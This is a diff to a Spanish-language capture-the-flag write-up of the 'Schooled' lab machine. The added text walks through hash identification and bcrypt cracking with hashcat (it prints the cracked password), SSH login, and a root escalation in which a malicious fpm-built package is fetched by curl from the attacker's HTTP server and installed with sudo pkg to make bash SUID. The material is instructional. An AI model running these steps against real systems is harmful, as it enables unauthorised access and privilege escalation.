@@ -390,9 +390,18 @@ We will find a file "config.php"
 Containing database login credentials
 ![config](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/config.PNG)
 
+Resulta que el valor de $PATH del usuario que nos provee la shell en el sistema ("www") es muy corto y no abarca todas las vias en las que pueden haber comandos que se puedan utilizar, por esto, una solución que podemos aplicar es en nuestro sistema:
 
-[[[Aqui explicar pq razón mysql no puede ser usado en el sistema y se debe sobreescribir el $PATH con nuestro $PATH por ejemplo]]]
+```bash
+echo $PATH
+```
 
+copiamos el valor de nuestro $PATH, (no importa que hayan rutas que tal vez no existan en la maquina objetivo, esto nos servira para que el usuario ("www") de la shell pueda ejecutar mas comandos). Y en la maquina objetivo escribimos el comando:
+
+```bash
+export PATH=[Aqui va todo nuestro $PATH] 
+```
+Ahora si podremos utilizar comandos como "mysql"
 una vez hecho eso:
 
 
@@ -426,21 +435,144 @@ mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_
 ![home]()
 De todas estas nos interesan aquellas de "jamie" y "steve" ya que son los usuarios que cuentan con un directorio en /home/
 
-además de que Jamie es Admin y pues steve no esta 
+Además de que Jamie es Admin y pues steve no esta en el sistema. Así que vamos a copiarnos a nuestro sistema el Hash correspondiente a Jamie (Admin)
 
 Si rompemos el hash y pensamos en que podria estarse reutilizando la clave del usuario Jamie, podriamos ingresar por ssh al sistema
 Podemos romper el hash utilizando herrramientas como hashcat y reconociendo el formato con el que esta encriptada la contraseña
 Esto lo podemos hacer asi:
 
-[[[Explicar como aproximadamente reconocer hashes]]]
+### Pequeña anotación [¿Como reconocer probables formatos de Hashes?]
 
 
+Esto lo podemos hacer mediante el uso de expresiones regulares
+Tenemos nuestro Hash a romper:
+
+![hashformat]()
+
+Así:
+```bash
+hashcat --example-hashes | grep -oP '\$2\w\$\d{2}\$'
+```
+De esta forma estamos diciendo que nuestro hash esta compuesto primeramente por los simbolos "$2" seguido de un caracter (y) representado como "w" y luego sigue otro signo "$", seguido de dos digitos y un "$" más
+**[Puede sonar confuso, pero simplemente estamos ingresando el patrón que se observa en el hash con el que contamos]**
+
+![hashrecognize1]()
+
+y vemos que hay por lo menos 4 tipos de formatos que se adecuan a nuestro hash, sin embargo, vemos que aquellos de forma ($2a$05$) serian los mas probables, asi que vamos a filtrar con grep para ese patrón:
+**(Es necesario colocar antes de los signos "$" un "\" para que sea posible reconocerlos)**
+```bash
+hashcat --example-hashes | grep '\$2a\$05\$' -B 11
+```
+
+Y podemos ver que el formato mas probable del hash es **"bcrypt"**
+
+Así que entonces utilizemos **hashcat** para crackear el Hash.
+
+```bash
+hashcat -m 3200 -a 0 hash /[wordlist] --user
+```
+Donde:
+- -m indica el modo a utilizar para romper el hash (bcrypt)
+- -a indica el modo de ataque (fuerza bruta)
+- hash (nombre del archivo donde se encuentra el hash)
+- wordlist = wordlist (podria ser rockyou)
+- --user (Flag que le indica a Hashcat que el hash se encuentra en formato [Usuario:Hash])
+
+**(Otra Nota interesante)**
+Si ya se ha crackeado un hash con hashcat y queremos ver su resultado en texto plano, podemos usar:
+```bash
+hashcat -m 3200 --show hash --user
+```
 ![hash]()
 
-entonces logramos obtener utilizando hashcat 
-De esta forma la contraseña del usuario Jamie es:
+
+De esta forma la contraseña del usuario Jamie es: **!QAZ2wsx**
+
+Entonces, podemos intentar entrar al sistema por **ssh** utilizando el Usuario de Jamie y la contraseña que hemos crackeado.
+
+```bash
+ssh jamie@[IP]
+```
+![userflag]()
+
+**Perfecto!**
+
+Ahora, ya que nos encontramos como el usuario **"Jamie"**, la idea es convertirnos en **root** dentro del sistema.
+
+con el comando:
+
+```bash
+sudo -l
+```
+
+Nos es posible ver que tenemos algunos privilegios a nivel de **sudoers**
+![sudoers]()
+
+Así que vamos a recurrir a un recurso util para situaciones en las que contamos con binarios que podemos ejecutar [https://gtfobins.github.io/]
+
+![pkgtfobins]()
+
+**¿Cual es el objetivo?**
+Podemos ver que la explotación de este binario para escalar privilegios utiliza **fpm**, la maquina objetivo no cuenta con este recurso, así que nosotros se lo proporcionaremos
+Además el campo 'id' es aquel en el que vamos a poder ejecutar comandos, sin embargo nosotros no queremos ejecutar el comando 'id', sino, mas bien queremos ejecutar algo como '/bin/bash'. Podemos ver la ruta de este binario mediante:
+```bash
+ls -l /bin/bash
+```
+![SUID]()
+
+Podemos ver que el binario "/usr/local/bin/bash" tiene permisos "755".
+
+Nuestro **objetivo** seria que el binario que se encuentra en la ruta: "/usr/local/bin/bash" cuente con permisos **SUID** (4755)
+**¿Que es el permiso SUID?** [https://www.scaler.com/topics/special-permissions-in-linux/]
+
+**Entonces...**
+Nos instalamos **fpm** (En archlinux):
+
+```bash
+paru -S fpm
+```
+Entonces, una vez con fpm en la maquina. Podemos actuar de la siguiente forma, vamos a querer que nuestro comando luzca de esta forma:
+
+![comandoSUID]()
+
+y luego procedemos a ejecutar:
+
+```bash
+fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
+```
+
+Y se nos creara en nuestro directorio de trabajo un archivo ".txz". Vamos a subir este archivo a la maquina victima y procederemos a instalarlo:
+
+```bash
+[Maquina Local]
+```
+```bash
+python3 -m http.server
+```
+
+```bash
+[Maquina Victima]
+[Ojo, hacerlo en el directorio /tmp]
+```
+```bash
+curl -o x-1.0.txz http://[OurIP]/[File]
+```
+Una vez con el ".txz" en la maquina victima, segun **gtfobins** tendriamos que ejecutar:
+
+```bash
+sudo pkg install -y --no-repo-update ./x-1.0.txz
+```
+
+![SUIDaccomp]()
+
+"/usr/local/bin/bash" ahora cuenta con permisos **SUID**
+
+![bashp]()
 
 
-To be completed...
+A través del comando **bash -p** se inicia una nueva instancia de la shell Bash. La nueva instancia de Bash heredará los privilegios del propietario del archivo, que en este caso sería **root**
+
+![pwned.]()
+
 
 
